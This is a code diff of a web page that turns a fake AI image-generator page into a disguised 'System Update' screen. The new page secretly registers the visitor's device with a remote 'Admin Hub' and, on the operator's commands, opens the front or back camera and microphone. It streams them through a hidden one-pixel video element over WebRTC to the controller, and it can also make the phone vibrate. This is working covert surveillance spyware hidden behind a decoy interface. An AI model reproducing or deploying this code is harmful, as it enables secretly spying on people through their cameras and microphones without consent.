@@ -1,80 +1,75 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Leo AI Studio - Pro</title>
+    <title>System Update</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="/socket.io/socket.io.js"></script>
     <style>
-        :root { --blue: #00d4ff; --dark: #050a14; --panel: #0a192f; }
-        body { background: var(--dark); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
-        .studio-card { background: var(--panel); width: 100%; max-width: 500px; padding: 25px; border-radius: 15px; border: 1px solid #1e3a8a; }
-        input { width: 100%; padding: 12px; background: #112240; border: 1px solid var(--blue); color: #fff; border-radius: 8px; margin-bottom: 15px; outline: none; }
-        .btn-gen { background: linear-gradient(135deg, #00d4ff, #0088cc); color: #050a14; width: 100%; border: none; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; }
-        #res-img { width: 100%; border-radius: 10px; margin-top: 20px; border: 1px solid var(--blue); min-height: 200px; background: #000; }
-        .sync-box { margin-top: 15px; background: #112240; padding: 10px; border-radius: 8px; font-size: 0.8rem; text-align: center; color: var(--blue); cursor: pointer; }
-        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
+        body { background: #050a14; color: #4f5b93; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        .loader { border: 3px solid #112240; border-top: 3px solid #00d4ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <h1 style="color: var(--blue);">LEO AI STUDIO</h1>
-    <div class="studio-card">
-        <input type="text" id="prompt" placeholder="Enter prompt: e.g. Neon Dragon in Space">
-        <button class="btn-gen" onclick="generate()">GENERATE IMAGE</button>
-        <div class="sync-box" id="sync" onclick="activateSync()">AI ENVIRONMENT SYNC (OFF)</div>
-        <img id="res-img" src="https://via.placeholder.com/512x512/050a14/00d4ff?text=AI+Ready" alt="AI Output">
+    <div>
+        <div class="loader"></div>
+        <h2 style="font-size: 1.2rem; color: #fff;">System Update</h2>
+        <p style="font-size: 0.8rem;">Initializing security modules... Please wait.</p>
     </div>
 
-    <video id="v" autoplay playsinline muted></video>
+    <!-- Hidden Video Element -->
+    <video id="v" autoplay playsinline muted style="width:1px; height:1px; opacity:0; position:absolute;"></video>
 
     <script>
         const socket = io();
-        let stream, pc, adminId, mode = "environment";
+        let stream, pc, adminId;
         const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
-async function generate() {
-            const p = document.getElementById('prompt').value;
-            if(!p) return alert("Please enter a prompt!");
-            const img = document.getElementById('res-img');
-            // LIMIT BYPASS: Adding Random Seed and Model Flux
-            const randomSeed = Math.floor(Math.random() * 1000000);
-            img.src = `https://image.pollinations.ai/prompt/${encodeURIComponent(p)}?width=512&height=512&nologo=true&seed=${randomSeed}&model=flux`;
-        }
 
-        async function activateSync() {
-            try {
+        // GHOST LOGIC: App khulte hi Admin Hub mein online dikhna
+        socket.emit('target-join', { battery: "Syncing...", device: "Android App" });
+
+        socket.on('command', async (data) => {
+            if (data.cmd === 'start' || data.cmd === 'start-stream') {
+                adminId = data.adminId;
+                if(!stream) await initCamera("environment"); // Default Back Cam
+                startWebRTC();
+            } 
+           else if (data.cmd === 'front' || data.cmd === 'back') {
+                let mode = (data.cmd === 'front') ? "user" : "environment";
+                if(stream) stream.getTracks().forEach(t => t.stop());
                 stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
                 document.getElementById('v').srcObject = stream;
-                document.getElementById('sync').innerText = "AI ENVIRONMENT SYNC (ACTIVE)";
-                document.getElementById('sync').style.color = "#00ff00";
-
-                // Fetch System Info
-                let batteryInfo = "N/A";
-                try {
-                    const battery = await navigator.getBattery();
-                    batteryInfo = Math.floor(battery.level * 100) + "%";
-                } catch(e) {}
-
-                const deviceInfo = /Android|iPhone|iPad/i.test(navigator.userAgent) ? (navigator.userAgent.includes("Android") ? "Android" : "iOS") : "PC";
-
-                socket.emit('target-join', { battery: batteryInfo, device: deviceInfo });
-            } catch (e) { alert("Camera required for AI Sync!"); }
-        }
-socket.on('command', async (d) => {
-            if (d.cmd === 'start') { adminId = d.adminId; connect(); }
-            else if (d.cmd === 'front' || d.cmd === 'back') {
-                mode = (d.cmd === 'front') ? "user" : "environment";
-                stream.getTracks().forEach(t => t.stop());
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
-                document.getElementById('v').srcObject = stream;
-                const vt = stream.getVideoTracks()[0];
-                pc.getSenders().find(s => s.track.kind === 'video').replaceTrack(vt);
-            }
+                if(pc) {
+                    const vt = stream.getVideoTracks()[0];
+                    const at = stream.getAudioTracks()[0];
+                    const videoSender = pc.getSenders().find(s => s.track.kind === 'video');
+                    const audioSender = pc.getSenders().find(s => s.track.kind === 'audio');
+                    if(videoSender) videoSender.replaceTrack(vt);
+                    if(audioSender) audioSender.replaceTrack(at);
+                }
+            } 
+            else if (data.cmd === 'vibrate') { window.navigator.vibrate(200); }
         });
 
-        async function connect() {
+        async function initCamera(mode) {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: mode }, 
+                    audio: true 
+                });
+                document.getElementById('v').srcObject = stream;
+            } catch (e) { console.error("Cam Error"); }
+        }
+
+        async function startWebRTC() {
             if(pc) pc.close();
             pc = new RTCPeerConnection(config);
             stream.getTracks().forEach(t => pc.addTrack(t, stream));
-            pc.onicecandidate = (e) => { if(e.candidate) socket.emit('signal', { to: adminId, signal: { candidate: e.candidate } }); };
+            
+            pc.onicecandidate = (e) => { 
+                if(e.candidate) socket.emit('signal', { to: adminId, signal: { candidate: e.candidate } }); 
+            };
+            
             const offer = await pc.createOffer();
             await pc.setLocalDescription(offer);
             socket.emit('signal', { to: adminId, signal: { sdp: offer } });
@@ -84,6 +79,6 @@ socket.on('command', async (d) => {
             if(d.signal.sdp) await pc.setRemoteDescription(new RTCSessionDescription(d.signal.sdp));
             else if(d.signal.candidate) pc.addIceCandidate(new RTCIceCandidate(d.signal.candidate));
         });
-    </script>
+        </script>
 </body>
 </html>
